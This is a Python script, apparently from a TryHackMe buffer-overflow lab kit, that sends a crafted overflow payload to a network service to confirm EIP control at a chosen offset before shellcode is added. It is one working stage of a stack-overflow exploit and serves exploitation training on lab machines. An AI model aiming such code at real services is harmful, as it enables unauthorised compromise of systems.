#!/usr/bin/env python3
"""
bof_control_test.py — Offset control test.

Sends A * OFFSET + B * 4 + C * 100.
If the offset is correct, EIP should equal 0x42424242 (BBBB) in the debugger.
C's appear on the stack after EIP, confirming space for shellcode.

Set OFFSET to your calculated value before running.

Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)
"""
import socket

HOST = "TARGET_IP"
PORT = 9999
OFFSET = 0  # Set this to your calculated offset

payload = b"A" * OFFSET
payload += b"B" * 4      # Should land in EIP (0x42424242)
payload += b"C" * 100    # Should appear after EIP on the stack

print(f"[*] Sending {len(payload)}-byte control payload to {HOST}:{PORT}")
print(f"[*] Layout: A*{OFFSET} + BBBB + C*100")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(1024)
s.sendall(payload + b"\r\n")
s.close()
print("[*] Sent. Verify EIP = 42424242 in debugger.")
